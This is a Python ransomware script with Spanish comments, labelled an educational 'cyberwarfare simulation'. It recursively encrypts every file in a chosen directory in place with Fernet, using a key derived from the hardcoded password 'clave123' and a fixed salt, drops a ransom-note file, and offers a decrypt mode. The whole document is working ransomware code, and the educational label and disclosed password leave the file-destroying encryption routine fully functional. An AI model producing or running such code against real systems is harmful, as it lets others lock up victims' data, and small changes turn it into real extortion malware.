import os
import base64
import argparse
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Generar clave de cifrado basada en una contraseña
def generate_key(password):
    password = password.encode()
    salt = b'salt_'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key

# Cifrar archivos en el directorio
def encrypt_files(directory, key):
    if not os.path.exists(directory):
        print(f"[-] Error: El directorio {directory} no existe.")
        return
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = fernet.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"[+] Archivo cifrado: {file_path}")
            except Exception as e:
                print(f"[-] Error al cifrar {file_path}: {e}")

# Descifrar archivos en el directorio
def decrypt_files(directory, key):
    if not os.path.exists(directory):
        print(f"[-] Error: El directorio {directory} no existe.")
        return
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"[+] Archivo descifrado: {file_path}")
            except Exception as e:
                print(f"[-] Error al descifrar {file_path}: {e}")

# Mostrar nota de rescate personalizada
def display_ransom_note():
    note = """
    *** SIMULACIÓN DE CIBERGUERRA - RANSOMWARE ***
    ATENCIÓN: Sus datos han sido cifrados como parte de un ejercicio educativo.
    En un escenario real, un atacante podría exigir un rescate o usar esto para desestabilizar su infraestructura.
    Para descifrar, ejecute el script con --decrypt y use la contraseña: 'clave123'.
    *** NO USE ESTE CÓDIGO CON INTENCIONES MALICIOSAS ***
    """
    print(note)
    with open(os.path.join(os.getcwd(), "RANSOM_NOTE_CIBERGUERRA.txt"), "w") as f:
        f.write(note)

def main():
    parser = argparse.ArgumentParser(description="Simulación educativa de ransomware para ciberguerra")
    parser.add_argument("--encrypt", action="store_true", help="Cifrar archivos en el directorio especificado")
    parser.add_argument("--decrypt", action="store_true", help="Descifrar archivos en el directorio especificado")
    parser.add_argument("--directory", required=True, help="Ruta del directorio con archivos a cifrar/descifrar")
    args = parser.parse_args()

    password = "clave123"  # Contraseña para la simulación
    key = generate_key(password)
    directory = args.directory

    if args.encrypt:
        print(f"[*] Cifrando archivos en {directory}...")
        encrypt_files(directory, key)
        display_ransom_note()
    elif args.decrypt:
        print(f"[*] Descifrando archivos en {directory}...")
        decrypt_files(directory, key)
    else:
        print("Uso: python ransomware_ciberguerra.py [--encrypt | --decrypt] --directory <ruta>")

if __name__ == "__main__":
    main()
